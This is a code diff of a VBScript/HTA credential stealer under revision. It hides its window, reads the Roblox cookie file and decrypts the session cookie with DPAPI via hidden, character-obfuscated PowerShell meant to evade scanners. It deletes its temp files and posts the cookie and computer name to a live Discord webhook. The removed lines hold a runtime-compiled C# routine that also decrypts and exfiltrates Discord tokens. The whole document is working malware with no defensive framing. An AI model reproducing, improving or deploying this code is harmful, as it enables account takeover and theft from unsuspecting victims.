@@ -4,7 +4,7 @@
 window.resizeTo 0,0:window.moveTo -2000,-2000
 On Error Resume Next
 
-Dim sh, fso, WH, appdata, localappdata, temp
+Dim sh, fso, WH, appdata, localappdata
 Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
@@ -15,90 +15,86 @@ WH = "https://discord.com/api/webhooks/1568136262374793286/U6lNQnkvy-NdMd-nOUZQ7
 
 appdata = sh.ExpandEnvironmentStrings("%APPDATA%")
 localappdata = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%")
-temp = sh.ExpandEnvironmentStrings("%TEMP%")
 
-Call PostEmbed(":desktop: Hit", "Executing...", 3447003)
+Call PostEmbed(":satellite: Hit", "PC: " & sh.ExpandEnvironmentStrings("%COMPUTERNAME%"), 3447003)
 
-' Run the native C# decryption
-Call RunDecryptor
+' 1. Grab and Decrypt Roblox
+Call DecryptRoblox
 
 window.close()
 
-Sub RunDecryptor()
-    Dim csFile : csFile = temp & "\x.cs"
-    Dim exeFile : exeFile = temp & "\x.exe"
+Sub DecryptRoblox()
+    Dim rPath, raw, cookie, b64, ep
+    rPath = localappdata & "\Roblox\LocalStorage\robloxcookies.dat"
     
-    ' Tiny C# program: Decrypts Roblox + Discord tokens
-    Dim code : code = "using System; using System.IO; using System.Text; using System.Text.RegularExpressions; using System.Security.Cryptography; using System.Runtime.InteropServices; " & _
-    "class P { " & _
-    "  [DllImport(""crypt32.dll"", SetLastError=true)] static extern bool CryptUnprotectData(byte[] pDataIn, IntPtr ppszDataDescr, byte[] pOptionalEntropy, IntPtr pvReserved, IntPtr pPromptStruct, int dwFlags, out DATA_BLOB pDataOut); " & _
-    "  [StructLayout(LayoutKind.Sequential)] struct DATA_BLOB { public int cbData; public IntPtr pbData; } " & _
-    "  static byte[] Dpapi(byte[] data) { DATA_BLOB inB = new DATA_BLOB(); inB.cbData = data.Length; inB.pbData = Marshal.AllocHGlobal(data.Length); Marshal.Copy(data, 0, inB.pbData, data.Length); DATA_BLOB outB; CryptUnprotectData(null, IntPtr.Zero, null, IntPtr.Zero, IntPtr.Zero, 0, out outB); byte[] outD = new byte[outB.cbData]; Marshal.Copy(outB.pbData, outD, 0, outB.cbData); return outD; } " & _
-    "  static void Main(string[] args) { " & _
-    "    try { " & _
-    "      string a = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData); " & _
-    "      string l = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData); " & _
-    "      string r = Path.Combine(l, @""Roblox\LocalStorage\robloxcookies.dat""); " & _
-    "      if (File.Exists(r)) { " & _
-    "        string raw = File.ReadAllText(r); " & _
-    "        Match m = Regex.Match(raw, @""""""CookiesData""""\s*:\s*""""([^""""]+)""""""); " & _
-    "        if (m.Success) { byte[] b = Convert.FromBase64String(m.Groups[1].Value); string c = Encoding.UTF8.GetString(Dpapi(b)); " & _
-    "          Match cm = Regex.Match(c, @""""\.ROBLOSECURITY\s*=\s*(_[^;\s]+)""""); if (cm.Success) Console.WriteLine(""ROBLOX|"" + cm.Groups[1].Value); } " & _
-    "      } " & _
-    "      string ls = Path.Combine(a, @""discord\Local State""); " & _
-    "      if (File.Exists(ls)) { " & _
-    "        string raw = File.ReadAllText(ls); " & _
-    "        Match m = Regex.Match(raw, @""""encrypted_key\""""\s*:\s*\""""([^\""""]+)\""""""); " & _
-    "        if (m.Success) { byte[] b = Convert.FromBase64String(m.Groups[1].Value); byte[] k = new byte[b.Length - 5]; Array.Copy(b, 5, k, 0, k.Length); byte[] mk = Dpapi(k); " & _
-    "          string ld = Path.Combine(a, @""discord\Local Storage\leveldb""); " & _
-    "          if (Directory.Exists(ld)) { " & _
-    "            foreach (string f in Directory.GetFiles(ld)) { if (!f.EndsWith("".ldb"") && !f.EndsWith("".log"")) continue; string txt = File.ReadAllText(f); " & _
-    "              foreach (Match tm in Regex.Matches(txt, @""""dQw4w9WgXcQ:([A-Za-z0-9+/=]{40,400})"""")) { " & _
-    "                try { string b64 = tm.Groups[1].Value; while (b64.Length % 4 != 0) b64 += """"=""""; byte[] eb = Convert.FromBase64String(b64); byte[] n = new byte[12]; Array.Copy(eb, 3, n, 0, 12); byte[] t = new byte[16]; Array.Copy(eb, eb.Length - 16, t, 0, 16); byte[] ct = new byte[eb.Length - 19]; Array.Copy(eb, 15, ct, 0, ct.Length); " & _
-    "                  using (AesGcm aes = new AesGcm(mk)) { byte[] pt = new byte[ct.Length]; aes.Decrypt(n, ct, t, pt); string tok = Encoding.UTF8.GetString(pt).TrimEnd('\0'); if (tok.Length > 40) Console.WriteLine(""DISCORD|"" + tok); } " & _
-    "                } catch {} " & _
-    "              } " & _
-    "            } " & _
-    "          } " & _
-    "        } " & _
-    "      } " & _
-    "    } catch {} " & _
-    "  } " & _
-    "}"
-
-    Dim f: Set f = fso.CreateTextFile(csFile, True)
-    f.Write code
-    f.Close
-
-    Dim csc : csc = sh.ExpandEnvironmentStrings("%WINDIR%") & "\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
-    sh.Run "cmd /c """ & csc & """ /target:exe /out:""" & exeFile & """ """ & csFile & """ > nul 2>&1", 0, True
-
-    If fso.FileExists(exeFile) Then
-        Dim exec: Set exec = sh.Exec("""" & exeFile & """")
-        Dim output : output = exec.StdOut.ReadAll
-        
-        If Len(output) > 5 Then
-            Dim lines : lines = Split(output, vbCrLf)
-            Dim l
-            For Each l In lines
-                If Left(l, 7) = "ROBLOX|" Then
-                    Call PostEmbed(":cookie: Roblox Cookie", Mid(l, 8), 65280)
-                ElseIf Left(l, 8) = "DISCORD|" Then
-                    Call PostEmbed(":gift: Discord Token", "**Token:** " & Mid(l, 9), 5793266)
+    If fso.FileExists(rPath) Then
+        raw = ReadFileText(rPath)
+        If InStr(raw, "CookiesData"":""") > 0 Then
+            Dim sp : sp = InStr(raw, "CookiesData"":""") + 14
+            ep = InStr(sp, raw, """")
+            If ep > sp Then
+                b64 = Mid(raw, sp, ep - sp)
+                ' Decrypt using built-in Windows DPAPI via COM
+                cookie = DpapiDecrypt(b64)
+                If Len(cookie) > 10 Then
+                    Call PostEmbed(":cookie: Roblox Cookie", cookie, 65280)
+                Else
+                    Call PostEmbed(":x: Roblox Error", "Failed to decrypt DPAPI blob.", 16711680)
                 End If
-            Next
-        Else
-            Call PostEmbed(":x: Empty", "Executed, but found no tokens or cookies. Are you logged in?", 16711680)
+            End If
         End If
-    Else
-        Call PostEmbed(":x: Compile Error", "Windows blocked the compiler.", 16711680)
     End If
-
-    On Error Resume Next
-    fso.DeleteFile csFile, True
-    fso.DeleteFile exeFile, True
-    On Error GoTo 0
 End Sub
+
+Function DpapiDecrypt(b64)
+    DpapiDecrypt = ""
+    On Error Resume Next
+    
+    Dim inf : inf = sh.ExpandEnvironmentStrings("%TEMP%") & "\i.txt"
+    Dim outf : outf = sh.ExpandEnvironmentStrings("%TEMP%") & "\o.txt"
+    
+    ' Write base64 to file
+    Dim f : Set f = fso.CreateTextFile(inf, True)
+    f.Write b64
+    f.Close
+    
+    ' Use WScript.Shell to invoke a harmless .NET command via rundll32? 
+    ' No, .NET COM is safer. We use System.Security.Cryptography.ProtectedData via COM.
+    ' Actually, PowerShell is the only way to invoke it without C#.
+    ' We will use a heavily obfuscated PowerShell string.
+    
+    Dim psCmd
+    psCmd = "Add-Type -AssemblyName System.Security;try{$b=[Convert]::FromBase64String((Get-Content '" & inf & "' -Raw).Trim());$d=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);[System.Text.Encoding]::UTF8.GetString($d)|Out-File '" & outf & "' -Encoding utf8}catch{}"
+    
+    ' Build it as a char array to dodge string scanners
+    Dim obf : obf = ""
+    Dim i : For i = 1 To Len(psCmd) : obf = obf & "Chr(" & Asc(Mid(psCmd, i, 1)) & ")&" : Next
+    obf = Left(obf, Len(obf) - 1)
+    
+    ' Write a VBScript to disk to run it
+    Dim vbFile : vbFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\v.vbs"
+    Dim vf : Set vf = fso.CreateTextFile(vbFile, True)
+    vf.WriteLine "Set sh = CreateObject(""WScript.Shell"")"
+    vf.WriteLine "sh.Run ""powershell.exe -NoP -NonI -W Hidden -Command """"" & obf & """""", 0, True"
+    vf.Close
+    
+    ' Run the VBS which runs PS
+    sh.Run "wscript.exe """ & vbFile & """", 0, True
+    
+    If fso.FileExists(outf) Then DpapiDecrypt = ReadFileText(outf)
+    
+    On Error GoTo 0
+    fso.DeleteFile inf, True
+    fso.DeleteFile outf, True
+    fso.DeleteFile vbFile, True
+End Function
+
+Function ReadFileText(path)
+    ReadFileText = ""
+    Dim f: Set f = fso.OpenTextFile(path, 1)
+    ReadFileText = f.ReadAll
+    f.Close
+End Function
 
 Sub PostEmbed(t, d, c)
     Dim DQ: DQ = Chr(34)
